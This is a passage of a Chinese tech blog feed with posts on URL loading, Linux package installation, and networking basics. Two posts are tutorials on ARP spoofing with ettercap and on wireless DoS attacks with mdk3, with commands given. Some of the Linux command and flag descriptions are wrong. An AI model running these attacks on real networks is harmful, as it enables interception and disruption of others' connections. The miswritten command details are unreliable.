title="访问一个网址的过程背后发生的那些事"></a>访问一个网址的过程背后发生的那些事</h2><p>1)<strong>回车键按下后，浏览器首先会对输入的地址数据进行解析</strong></p><p>1.1、检查输入的URL是http协议，请求资源是对应主机名网站主页。<br>1.2、然后检查浏览器的严格安全传输列表（ HSTS列表 ），如果网站在列表中，则浏览器直接使用https协议进行传输，否则直接使用http协议传输，或者先使用http协议向网站服务器发送一个请求，服务器返回浏览器只能以https协议进行，则接下来仍然只以https协议来进行传输。<br>1.3、然后检查输入地址中是否有非ASCII码的unicode字符，如果有的话进行字符转换。<br>1.4、当协议或主机名不合法时，浏览器会将地址栏中输入的内容传递给默认的搜索引擎。</p><p>2)<strong>然后进行DNS递归查询</strong></p><p>2.1、DNS查询过程中，首先在缓存中进行查询，找到直接返回结果否则<br>2.2、再使用gethostbynme库函数进行查询，库函数查询过程中，首先到hosts中进行检查，查看域名是否在本地hosts文件中，找到直接返回结果，如果没有记录且库函数查询也没有记录则<br>2.3、以上查询均未果，则会向DNS服务器发送一条DNS查询请求。查询DNS服务器通常是在本地路由器或者ISP的缓存DNS服务器上进行，如果对应记录存在，则返回该映射地址，并且该地址会被标记为非权威服务器应答标签，如果对应记录不存在，则会递归向高层 DNS 服务器做查询，直到返回最终结果。<br>2.4、如果DNS查询失败，则返回无法解析DNS地址，停止，否则浏览器根据查询到的对应ip地址进行下一步操作，即使用套接字进行数据访问。</p><p>3)<strong>使用套接字进行数据访问</strong></p><p>3.1、浏览器获得目标IP地址，以及URL中给出的端口号（http 协议默认端口号是 80， https 默认端口号是 443），调用系统库函数socket，请求一个TCP流套接字。<br>3.2、该请求首先被交给传输层，封装成TCP segment，然后被送往网络层，添加目标服务器IP地址以及本机的IP地址，封装成TCP packet，再接下来会进入链路层，在封包中加入frame头部，包含本机网卡的MAC地址和网关MAC地址等，形成最终的TCP封包。<br>3.3、TCP封包完成之后，会通过以太网等网络进行传输到目标地址。</p><p><img src="/images/fengbao.png"></p><p>4)<strong>建立TCP连接</strong></p><p>建立TCP连接会进行三次握手的过程，然后进行发送HTTP请求过程和接收过程。<br>4.1、进行三次握手，首先向服务器发送一个syn报文，其中syn&#x3D;1，seq number&#x3D;1022(随机)；<br>4.2、服务器接收到syn报文，根据syn&#x3D;1判断客户端请求建立连接，并返回一个syn报文，为第一次握手，其中ack number&#x3D;1023(客户端seq number+1)，seq number&#x3D;2032(随机)，syn&#x3D;1，ack&#x3D;1；<br>4.3、客户端根据服务器的syn报文，确认其ack number是否与上一次发送的seq number+1相等，且ack&#x3D;1，确认正确，则回应一个ack报文，为第二次握手，即ack number&#x3D;2033(服务器seq number+1)，ack&#x3D;1，<br>4.4、服务器根据接收到的ack报文，确认ack number是否与上一次发送的seq number+1相等，并且ack&#x3D;1，确认正确，则建立连接，进入Established状态，为第三次握手。<br>4.5、建立TCP连接后，会使用HTTP协议发送HTTP的GET请求，服务器处理请求返回资源数据。</p><p>5)<strong>浏览器处理数据</strong></p><p>5.1、再接收到所请求的资源之后，浏览器会对接收到的html、css、js等数据根据标准格式进行解析。<br>5.2、然后会通过构建和遍历DOM节点树，进行各个节点的渲染计算，最后进行GPU的渲染布局和绘制步骤等。</p>]]></content>
    
    
    
    <tags>
      
      <tag>计算机网络</tag>
      
      <tag>协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux下软件的安装</title>
    <link href="/blog/2018/09/23/Linux%E4%B8%8B%E8%BD%AF%E4%BB%B6%E7%9A%84%E5%AE%89%E8%A3%85/"/>
    <url>/blog/2018/09/23/Linux%E4%B8%8B%E8%BD%AF%E4%BB%B6%E7%9A%84%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<p><strong>今天突然想给自己的虚拟机装点软件，可是发现自己以前只会装tar.gz的安装包，今天记一下其他的安装方法。</strong></p><p><img src="/images/fj13.jpg"></p><span id="more"></span><h1 id="一、-解析Linux应用软件安装包："><a href="#一、-解析Linux应用软件安装包：" class="headerlink" title="一、 解析Linux应用软件安装包："></a>一、 解析Linux应用软件安装包：</h1><p>通常Linux应用软件的安装包有三种：<br>　　1. tar包，如software-1.2.3-1.tar.gz。它是使用UNIX系统的打包工具tar打包的。<br>　　2. rpm包，如software-1.2.3-1.i386.rpm。它是Redhat Linux提供的一种包封装格式。<br>　　3. dpkg包，如software-1.2.3-1.deb。它是Debain Linux提供的一种包封装格式。</p><p>而且，大多数Linux应用软件包的命名也有一定的规律，它遵循：<br>名称-版本-修正版-类型<br>例如：　　</p><ol><li>software-1.2.3-1.tar.gz 意味着：<br>　　　软件名称：software<br>　　　版本号：1.2.3<br>　　　修正版本：1<br>　　　类型：tar.gz，说明是一个tar包。</li><li>sfotware-1.2.3-1.i386.rpm<br>　　　软件名称：software<br>　　　版本号：1.2.3<br>　　　修正版本：1<br>　　　可用平台：i386，适用于Intel 80x86平台。<br>　　　类型：rpm，说明是一个rpm包。<br>　　　注：由于rpm格式的通常是已编译的程序，所以需指明平台。在后面会详细说明。</li></ol><h1 id="二、-了解包里的内容："><a href="#二、-了解包里的内容：" class="headerlink" title="二、 了解包里的内容："></a>二、 了解包里的内容：</h1><p>一个Linux应用程序的软件包中可以包含两种不同的内容：</p><p>　1. 一种就是可执行文件，也就是解开包后就可以直接运行的。在Windows中所 有的软件包都是这种类型。安装完这个程序后，你就可以使用，但你看不到源程序。而且下载时要注意这个软件是否是你所使用的平台，否则将无法正常安装。</p><p>　2. 另一种则是源程序，也就解开包后，你还需要使用编译器将其编译成为可执行文件。这在Windows系统中是几乎没有的，因为Windows的思想是不开放源程序的。<br>　通常，用tar打包的，都是源程序；而用rpm、dpkg打包的则常是可执行程序。一般来说，自己动手编译源程序能够更具灵活性，但也容易遇到各 种问题和困难。而相对来说，下载那些可执行程序包，反而是更容易完成软件的安装，当然那样灵活性就差多了。所以一般一个软件总会提供多种打包格式的安装程 序的。你可以根据自己的情况来选择。</p><h1 id="三、-搞定使用tar打包的应用软件"><a href="#三、-搞定使用tar打包的应用软件" class="headerlink" title="三、 搞定使用tar打包的应用软件"></a>三、 搞定使用tar打包的应用软件</h1><ol><li>安装：<br>整个安装过程可以分为以下几步：</li></ol><p>　- 取得应用软件：通过下载、购买光盘的方法获得；<br>　- 解压缩文件：一般tar包，都会再做一次压缩，如gzip、bz2等，所以你需要先解压。如果是最常见的gz格式，则可以执行：“tar –xvzf 软件包名”，就可以一步完成解压与解包工作。如果不是，则先用解压软件，再执行“tar –xvf 解压后的tar包”进行解包；<br>　- 阅读附带的INSTALL文件、README文件；<br>　- 执行“.&#x2F;configure”命令为编译做好准备；<br>　- 执行“make”命令进行软件编译；<br>　- 执行“make install”完成安装；<br>　- 执行“make clean”删除安装时产生的临时文件。<br>好了，到此大功告成。我们就可以运行应用程序了。但这时，有的读者就会问，我怎么执行呢？这也是一个Linux特色的问题。其实，一般来说， Linux的应用软件的可执行文件会存放在&#x2F;usr&#x2F;local&#x2F;bin目录下！不过这并不是“放四海皆准”的真理，最可靠的还是看这个软件的 INSTALL和README文件，一般都会有说明。</p><ol start="2"><li>卸载：<br>　通常软件的开发者很少考虑到如何卸载自己的软件，而tar又仅是完成打包的工作，所以并没有提供良好的卸载方法。<br>  那么是不是说就不能够卸载呢！其实也不是，有两个软件能够解决这个问题，那就是Kinstall和Kife，它们是tar包安装、卸载的黄金搭档。</li></ol><h1 id="四、-搞定使用rpm打包的应用软件"><a href="#四、-搞定使用rpm打包的应用软件" class="headerlink" title="四、 搞定使用rpm打包的应用软件"></a>四、 搞定使用rpm打包的应用软件</h1><p>rpm可谓是Redhat公司的一大贡献，它使Linux的软件安装工作变得更加简单容易。</p><ol><li>安装：<br>我只需简单的一句话，就可以说完。执行：<br> <code>rpm –ivh rpm软件包名</code><br>更高级的，请见下表：<br>　　  rpm参数 参数说明<br>　　   -i    安装软件<br>　　   -t     测试安装，不是真的安装<br>　　   -p   显示安装进度<br>　　   -f     忽略任何错误<br>　　   -U   升级安装<br>　　   -v    检测套件是否正确安装<br>这些参数可以同时采用。更多的内容可以参考RPM的命令帮助。</li><li>卸载：<br>我同样只需简单的一句话，就可以说完。执行：<br>　<code> rpm –e 软件名</code><br>不过要注意的是，后面使用的是软件名，而不是软件包名。例如，要安装software-1.2.3-1.i386.rpm这个包时，应执行：<br> <code>rpm –ivh software-1.2.3-1.i386.rpm</code><br>而当卸载时，则应执行： rpm –e software。</li></ol><p>　　<br>另外，在Linux中还提供了象GnoRPM、kpackage等图形化的RPM工具，使得整个过程会更加简单。这些软件的具体应用，笔者会另行文介绍。</p><h1 id="五、-搞定使用deb打包的应用程序"><a href="#五、-搞定使用deb打包的应用程序" class="headerlink" title="五、 搞定使用deb打包的应用程序"></a>五、 搞定使用deb打包的应用程序</h1><p>这是Debian Linux提供的一个包管理器，它与RPM十分类似。但由于RPM出现得更早，所以在各种版本的Linux都常见到。而debian的包管理器dpkg则 只出现在Debina Linux中，其它Linux版本一般都没有。我们在此就简单地说明一下：</p><ol><li>安装<br>　   <code>dpkg –i deb软件包名</code><br>　　如：<code>dpkg –i software-1.2.3-1.deb</code></li><li>卸载<br>　　 <code>dpkg –e 软件名</code><br>　　如：<code>dpkg –e software</code></li></ol><h1 id="六、软件的安装"><a href="#六、软件的安装" class="headerlink" title="六、软件的安装"></a>六、软件的安装</h1><p>　　—- Linux下软件的安装主要有两种不同的形式。第一种安装文件名为filename.tar.gz。另一种安装文件名为 filename.i386.rpm。以第一种方式发行的软件多为以源码形式发送的。第二种方式则是直接以二进制形式发行的。i386即表示该软件是按 Inter 386指令集编译生成的。<br>　　—- 对于第一种，安装方法如下：<br>　　—- 首先，将安装文件拷贝至你的目录中。例如，如果你是以root身份登录上的，就将软件拷贝至&#x2F;root中。<br>　　—- #cp filename.tar.gz &#x2F;root<br>　　—- 由于该文件是被压缩并打包的，所以，应对其解压缩。命令为：<br>　　—- #tar xvzf filename.tar.gz<br>　　—- 执行该命令后，安装文件按路径，解压缩在当前目录下。用ls命令可以看到解压缩后的文件。通常在解压缩后产生的文件中，有名为”INSTALL”的文件。该文件为纯文本文件，详细讲述了该软件包的安装方法。<br>　　—- 对于多数需要编译的软件，其安装的方法大体相同。执行解压缩后产生的一个名为configure的可执行脚本程序。它是用于检查系统是否有编译时所需的库，以及库的版本是否满足编译的需要等安装所需要的系统信息。为随后的编译工作做准备。命令为：<br>　　—- #.&#x2F;configure<br>　　—- 如果检查过程中，发现有错误，configure将给予提示，并停止检查。你可以跟据提示对系统进行配置。再重新执行该程序。检查通过后，将生成用于编译 的MakeFile文件。此时，可以开始进行编译了。编译的过程视软件的规模和计算机的性能的不同，所耗费的时间也不同。命令为：<br>　　—- #make<br>　　—- 成功编译后，键入如下的命令开始安装：<br>　　—- #make install<br>　　—- 安装完毕，应清除编译过程中产生的临时文件和配置过程中产生的文件。键入如下命令：<br>　　<code>#make clean </code><br>　　<code>#make distclean</code><br>　　至此，软件的安装结束。<br>　　—- 对于第二种，其安装方法要简单的多。<br>　　—- 同第一种方式一样，将安装文件拷贝至你的目录中。然后使用rpm来安装该文件。命令如下：<br>　　—- #rpm -i filename.i386.rpm<br>　　—- rpm将自动将安装文件解包，并将软件安装到缺省的目录下。并将软件的安装信息注册到rpm的数据库中。参数i的作用是使rpm进入安装模式。<br>　　—- 另外，还有一些Linux平台下的商业软件。在其安装文件中，有Setup安装程序，其安装方法同Windows平台下的一样。如:Corel WordPerfect。<br>　　软件的卸载<br>　　—- 软件的卸载主要是使用rpm来进行的。卸载软件首先要知道软件包在系统中注册的名称。键入命令：<br>　　—- #rpm -q -a<br>　　—- 即可查询到当前系统中安装的所有的软件包。参数q的作用是使rpm进入查询命令模式。参数a是查询模式的子参数，意为全部（ALL）。查询到的信息较多，可使用less人屏显示。<br>　　—- 确定了要卸载的软件的名称，就可以开始实际卸载该软件了。键入命令：<br>　　—- #rpm -e [package name]<br>　　—- 即可卸载软件。参数e的作用是使rpm进入卸载模式。对名为[package name]的软件包进行卸载。由于系统中各个软件包之间相互有依赖关系。如果因存在依赖关系而不能卸载，rpm将给予提示并停止卸载。你可以使用如下的命 令来忽略依赖关系，直接开始卸载：<br>　　—- #rpm -e [package name] -nodeps<br>　　—- 忽略依赖关系的卸载可能会导致系统中其它的一此软件无法使用。你可以使用<br>　　—- #rpm -e [package name] -test<br>　　—- 使rpm进行一次卸载预演，而不是真正卸载。这样可以使你检查一下软件是否存在有依赖关系。卸载过程中是否有错误。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Linux基础知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>无线监听</title>
    <link href="/blog/2018/09/09/%E6%97%A0%E7%BA%BF%E7%9B%91%E5%90%AC/"/>
    <url>/blog/2018/09/09/%E6%97%A0%E7%BA%BF%E7%9B%91%E5%90%AC/</url>
    
    <content type="html"><![CDATA[<p><strong>今天了解一下ARP欺骗的概念，学习使用ettercap工具进行，学习使用driftnet、sslstrip等工具监听消息。</strong></p><p><img src="/images/fj12.jpg"></p><span id="more"></span><h1 id="ARP欺骗与消息监听概述"><a href="#ARP欺骗与消息监听概述" class="headerlink" title="ARP欺骗与消息监听概述"></a>ARP欺骗与消息监听概述</h1><h2 id="什么是ARP（地址解析协议）"><a href="#什么是ARP（地址解析协议）" class="headerlink" title="什么是ARP（地址解析协议）"></a>什么是ARP（地址解析协议）</h2><p>地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP&#x2F;IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。地址解析协议是建立在网络中各个主机互相信任的基础上的，网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存；由此攻击者就可以向某一主机发送伪ARP应答报文，使其发送的信息无法到达预期的主机或到达错误的主机，这就构成了一个ARP欺骗。ARP命令可用于查询本机ARP缓存中IP地址和MAC地址的对应关系、添加或删除静态对应关系等。相关协议有RARP、代理ARP。NDP用于在IPv6中代替地址解析协议。</p><p>在无线网络环境中，ARP欺骗的对象是受攻击的设备以及无线网关。攻击者首先需要接入目标所在的无线网络，随后向受攻击设备冒充自己是无线网关，同时向无线网关冒充自己是发起请求的用户，开启攻击机上的IP转发功能，使自己成为整个通信过程中的中转站，从而能够监听到所有的通信数据，能够进一步篡改数据。</p><h1 id="实战练习"><a href="#实战练习" class="headerlink" title="实战练习"></a>实战练习</h1><h2 id="1-使用ettercap工具进行ARP欺骗（无需开启监听模式）"><a href="#1-使用ettercap工具进行ARP欺骗（无需开启监听模式）" class="headerlink" title="1.使用ettercap工具进行ARP欺骗（无需开启监听模式）"></a>1.使用ettercap工具进行ARP欺骗（无需开启监听模式）</h2><ol><li>开启本机的ip转发功能。<br>输入命令：<br><code>echo 1 &gt;/proc/sys/net/ipv4/ip_forward</code></li><li>修改ettercap的配置文件<br>输入命令：<br><code>leafpad /etc/ettercap/etter.conf</code><br>修改：<br>[privs]<br>ec_uid &#x3D; 0                # nobody is the default<br>ec_gid &#x3D; 0                # nobody is the default<br>找到iptables，将其注释删除。</li><li>打开ettercap，选择菜单项Sniff-&gt;Unified sniffing,扫描当前网络中的设备，在弹出的窗口中选择接口，选择wlan0（无线网卡对应接口），单击OK。</li><li>选择Hosts-&gt;Hosts list,进入终端列表。再选择Hosts-&gt;Scan for hosts,扫描当前网络中的设备。</li><li>选择目标设备IP，单击Add to Target 1按钮，选择 网关的IP，单击Add to Target 2。</li><li>单击菜单Mitm-&gt;ARP Poisoning,在弹出的对话框中选择Sniff remote connections。</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>工具使用</tag>
      
      <tag>无线渗透</tag>
      
      <tag>kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>无线DoS攻击</title>
    <link href="/blog/2018/09/08/%E6%97%A0%E7%BA%BFDoS%E6%94%BB%E5%87%BB/"/>
    <url>/blog/2018/09/08/%E6%97%A0%E7%BA%BFDoS%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<p><strong>今天了解一下一种常见的无线攻击方式——无线DoS攻击。使用的工具是mdk3。</strong></p><p><img src="/images/fj11.jpg"></p><span id="more"></span><h1 id="MDK介绍"><a href="#MDK介绍" class="headerlink" title="MDK介绍"></a>MDK介绍</h1><p>MDK 是利用IEEE 802.11 协议中的漏洞开发的攻击工具。本次将主要利用MDK 3 工具进行三种攻击，MDK3详细使用指南可以百度一下。</p><h2 id="MDK3的三种攻击模式"><a href="#MDK3的三种攻击模式" class="headerlink" title="MDK3的三种攻击模式"></a>MDK3的三种攻击模式</h2><h3 id="1-Beacon-Flood模式"><a href="#1-Beacon-Flood模式" class="headerlink" title="1.Beacon Flood模式"></a>1.Beacon Flood模式</h3><p>AP发出每秒钟约10个信标帧使客户端能够探测到这些AP的存在。当客户端扫描无线网络时，实际是在每个信道扫描寻找信标帧。通过使用MDK3工具的Beacon Flood模式，也能够发送这些信标帧，但是这些网络都是假的，没有人能够真正连接到它们。但是当用户打开无线网络进行扫描时，这些无线网络都会出现在设备的列表中。此外，这种模式也可以通过伪造大量具有相同SSID的假冒网络来隐藏目标网络。</p><h3 id="2-Authentication（身份验证）-DOS模式"><a href="#2-Authentication（身份验证）-DOS模式" class="headerlink" title="2.Authentication（身份验证） DOS模式"></a>2.Authentication（身份验证） DOS模式</h3><p>当一个客户端接入一个AP，需要满足几个步骤，其中两个基本步骤就是认证和关联。第一步会询问AP是否能接入一个新的设备，AP收到请求后会决定新的客户端是否被接受。如果一个未知的客户端会尝试连接，mac过滤器可能会拒绝这一请求。第二步是密钥验证阶段，大多数AP采用开放的模式，因此关联步骤总是会通过，真正验证密钥有效性的阶段将在后面进行（例如WPA中的EAP阶段）。这么做的缺点在于攻击者可以发起多个连接请求后放弃这些请求，但是AP会在内存中保留这些请求。此攻击模式会向AP发送尽可能多的连接请求，同时跟踪AP的响应，甚至会发送网络中截获的其他有效数据包，来混淆AP对于真假客户端的判断，可能会造成AP丢弃合法用户的连接请求。</p><h3 id="3-Deauthentication-x2F-Disassociation-Amok-模式"><a href="#3-Deauthentication-x2F-Disassociation-Amok-模式" class="headerlink" title="3.Deauthentication&#x2F;Disassociation Amok 模式"></a>3.Deauthentication&#x2F;Disassociation Amok 模式</h3><p>如果一个客户端需要断开无线网络，他需要向AP发送Deauthentication包注销自己。同时AP也可以主动断开与客户端的连接，例如AP的连接列表已满，新的连接将旧的连接踢出。攻击者可以伪造包使合法用户断开连接。MDK3可以伪造多种包，来应对如下情况：</p><ul><li>AP主动取消客户端认证</li><li>客户端主动取消与AP的认证</li><li>AP主动与客户端取消关联</li><li>客户端主动与AP取消关联</li></ul><h1 id="使用Kali-Linux进行三种攻击实战"><a href="#使用Kali-Linux进行三种攻击实战" class="headerlink" title="使用Kali Linux进行三种攻击实战"></a>使用Kali Linux进行三种攻击实战</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>首先你需要一块无线网卡，kali虚拟机（为了方便直接使用，里面的小工具很多，不用再去自己下载了）</p><h3 id="1-查看你的网卡信息"><a href="#1-查看你的网卡信息" class="headerlink" title="1.查看你的网卡信息"></a>1.查看你的网卡信息</h3><p>在kali Linux下使用命令查看网卡信息。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ifconfig</span><br></code></pre></td></tr></table></figure><p>效果图如下：<br><img src="/images/aircrack-ng.png"></p><p>可以看到里面有个wlan0，那就是我的网卡，如果没有的话就把无线网卡拔了再插一下，直到找到那个wlan0为止。一定要保证它<strong>现在没有连接到任何wifi</strong>，上面那个wlan0里面<strong>没有ip地址</strong>什么的就说明现在不在连接中。</p><h3 id="2-激活无线网卡至monitor即监听模式"><a href="#2-激活无线网卡至monitor即监听模式" class="headerlink" title="2.激活无线网卡至monitor即监听模式"></a>2.激活无线网卡至monitor即监听模式</h3><p>使用命令：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">airmon-ng <span class="hljs-literal">start</span> wlan0<br></code></pre></td></tr></table></figure><p>然后会出现以下提示信息：<br><img src="/images/aircrack-ng1.png"></p><p>如果再次使用ifconfig可以发现，我们的网卡已经被重命名为wlan0mon</p><p><strong>获取当前网络概况：</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">airodump-ng wlan0mon<br></code></pre></td></tr></table></figure><p>其中wlan0mon是已经激活监听状态的网卡。</p><h2 id="进行Beacon-Flood攻击"><a href="#进行Beacon-Flood攻击" class="headerlink" title="进行Beacon Flood攻击"></a>进行Beacon Flood攻击</h2><p>这个模式可以产生很多死亡SSID充斥无线客户端的无线列表，从而扰乱无线使用者；我们甚至还可以自定义发送死亡SSID的BSSID和ESSID以及加密方式等。</p><p>参数说明：</p><ul><li>-f：读取SSID列表文件，默认生成随机SSID；</li><li>-c：信道，默认随机信道；</li><li>-s：发包率，默认50。</li></ul><p>新建字典文件SSID.txt ,字典文件中存的每一个条目为伪造SSID的名称。此步可以忽略，如果忽略，MDK3将生成随机字符串作为SSID。同理，mac地址也可以指定。</p><p>输入命令：<br><code>mdk3 wlan0mon b -f[文件路径] -s[速率]</code></p><p>创建如下文件：<br><img src="/images/ssidtxt.png"></p><p>结果如下：</p><p><img src="/images/mdk3-1-1.png"></p><p><img src="/images/mdk3-1-2.png"></p><h2 id="进行Authentication（身份验证）-DOS攻击"><a href="#进行Authentication（身份验证）-DOS攻击" class="headerlink" title="进行Authentication（身份验证） DOS攻击"></a>进行Authentication（身份验证） DOS攻击</h2><p>这是一种验证请求攻击模式，在这个模式里，MDK3工具自动模拟随机产生的mac向目标AP发起大量验证请求，可以导致AP忙于处理过多的请求而停止对正常连接的客户端的响应。由于目前绝大部分的的路由器都有应对这种DoS的防御措施，攻击效果并不明显。</p><p>参数说明：</p><ul><li>-a：测试指定的BSSID；</li><li>-m：使用有效的mac地址进行攻击；</li><li>-c：不检查是否测试成功；</li><li>-s:速率，默认50.</li></ul><p>输入命令：<br><code>mdk3 wlan0mon a -a [BSSID] -m</code></p><p><img src="/images/mdk3-2-1.png"><br>显然攻击是失败的！</p><h2 id="进行Deauthentication-x2F-Disassociation-Amok攻击"><a href="#进行Deauthentication-x2F-Disassociation-Amok攻击" class="headerlink" title="进行Deauthentication&#x2F;Disassociation Amok攻击"></a>进行Deauthentication&#x2F;Disassociation Amok攻击</h2><p>这是强制解除验证、解除连接的攻击。在这个模式下，MDK3工具会向周围所有可见AP发起循环攻击，可能造成一定范围内的无线网络瘫痪，直到手动停止攻击。</p><p>参数说明：</p><ul><li>-w：白名单，白名单中的mac不会被攻击；</li><li>-b：黑名单，工具会对黑名单中的mac进行攻击；</li><li>-s：发包速率；</li><li>-c：攻击信道，可以攻击多个信道，逗号分隔。</li></ul><p>为了避免大范围攻击，建议使用黑名单模式进行攻击。新建mac.txt文件，将目标mac地址写入其中。</p><p>输入命令：<br><code>mdk3 wlan0mon d -b [文件路径]</code></p><p><img src="/images/mdk3-3-1.png"></p><div style="position:absolute; bottom:0px; left:610px; width:76%;"><br>  <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=25706282&auto=1&height=66"></iframe>  <br></div>]]></content>
    
    
    
    <tags>
      
      <tag>工具使用</tag>
      
      <tag>无线渗透</tag>
      
      <tag>kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络基本知识</title>
    <link href="/blog/2018/09/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/"/>
    <url>/blog/2018/09/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<p><strong>今天了解一下计算机网络的基础知识，为以后深入学习计算机网络做准备。</strong></p><p><img src="/images/fj10.jpg"></p><span id="more"></span><h1 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h1><h2 id="OSI分层（7层）"><a href="#OSI分层（7层）" class="headerlink" title="OSI分层（7层）"></a>OSI分层（7层）</h2><ol><li>物理层</li><li>数据链路层</li><li>网络层</li><li>运输层</li><li>会话层</li><li>表示层</li><li>应用层</li></ol><h2 id="TCP-x2F-IP分层（4层）"><a href="#TCP-x2F-IP分层（4层）" class="headerlink" title="TCP&#x2F;IP分层（4层）"></a>TCP&#x2F;IP分层（4层）</h2><ol><li>网络接口层</li><li>网络层</li><li>运输层</li><li>应用层</li></ol><h2 id="五层协议（5层）"><a href="#五层协议（5层）" class="headerlink" title="五层协议（5层）"></a>五层协议（5层）</h2><ol><li>物理层</li><li>数据链路层</li><li>网络层</li><li>运输层</li><li>应用层</li></ol><h2 id="五层协议概述"><a href="#五层协议概述" class="headerlink" title="五层协议概述"></a>五层协议概述</h2><ol><li>应用层：通过应用进程间的交互来完成特定网络应用</li></ol><ul><li>数据：报文</li><li>协议：HTTP, SMTP(邮件), FTP(文件传送)</li></ul><ol start="2"><li>运输层：向两个主机进程之间的通信提供通用的数据传输服务。</li></ol><ul><li>数据：TCP:报文段，UDP:用户数据报</li><li>协议：TCP, UDP</li></ul><ol start="3"><li>网络层：为分组交换网上的不同主机提供通信服务</li></ol><ul><li>数据：包或IP数据报</li><li>协议：IP</li></ul><ol start="4"><li>数据链路层：</li></ol><ul><li>数据：帧</li></ul><ol start="5"><li>物理层：</li></ol><ul><li>数据：比特</li></ul><h2 id="ARP-x2F-RARP协议"><a href="#ARP-x2F-RARP协议" class="headerlink" title="ARP&#x2F;RARP协议"></a>ARP&#x2F;RARP协议</h2><p><strong>地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个协议。</strong>主机发送信息时将包含目标IP地址的ARP请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。地址解析协议是建立在网络中各个主机互相信任的基础上的，网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存；由此攻击者就可以向某一主机发送伪ARP应答报文，使其发送的信息无法到达预期的主机或到达错误的主机，这就构成了一个ARP欺骗。ARP命令可用于查询本机ARP缓存中IP地址和MAC地址的对应关系、添加或删除静态对应关系等。</p><p>　　ARP工作流程举例：<br>　　主机A的IP地址为192.168.1.1，MAC地址为0A-11-22-33-44-01；<br>　　主机B的IP地址为192.168.1.2，MAC地址为0A-11-22-33-44-02；</p><p>当主机A要与主机B通信时，地址解析协议可以将主机B的IP地址（192.168.1.2）解析成主机B的MAC地址，以下为工作流程：</p><ol><li>根据主机A上的路由表内容，IP确定用于访问主机B的转发IP地址是192.168.1.2。然后A主机在自己的本地ARP缓存中检查主机B的匹配MAC地址。</li><li>如果主机A在ARP缓存中没有找到映射，它将询问192.168.1.2的硬件地址，从而将ARP请求帧广播到本地网络上的所有主机。源主机A的IP地址和MAC地址都包括在ARP请求中。本地网络上的每台主机都接收到ARP请求并且检查是否与自己的IP地址匹配。如果主机发现请求的IP地址与自己的IP地址不匹配，它将丢弃ARP请求。</li><li>主机B确定ARP请求中的IP地址与自己的IP地址匹配，则将主机A的IP地址和MAC地址映射添加到本地ARP缓存中。</li><li>主机B将包含其MAC地址的ARP回复消息直接发送回主机A。</li><li>当主机A收到从主机B发来的ARP回复消息时，会用主机B的IP和MAC地址映射更新ARP缓存。本机缓存是有生存期的，生存期结束后，将再次重复上面的过程。主机B的MAC地址一旦确定，主机A就能向主机B发送IP通信了。</li></ol><p><strong>逆地址解析协议，即RARP，功能和ARP协议相对，其将局域网中某个主机的物理地址转换为IP地址</strong>，比如局域网中有一台主机只知道物理地址而不知道IP地址，那么可以通过RARP协议发出征求自身IP地址的广播请求，然后由RARP服务器负责回答。<br>　　RARP协议工作流程：</p><ol><li>给主机发送一个本地的RARP广播，在此广播包中，声明自己的MAC地址并且请求任何收到此请求的RARP服务器分配一个IP地址；</li><li>本地网段上的RARP服务器收到此请求后，检查其RARP列表，查找该MAC地址对应的IP地址；</li><li>如果存在，RARP服务器就给源主机发送一个响应数据包并将此IP地址提供给对方主机使用；</li><li>如果不存在，RARP服务器对此不做任何的响应；</li><li>源主机收到从RARP服务器的响应信息，就利用得到的IP地址进行通讯；如果一直没有收到RARP服务器的响应信息，表示初始化失败。</li></ol><h2 id="TCP-x2F-IP协议"><a href="#TCP-x2F-IP协议" class="headerlink" 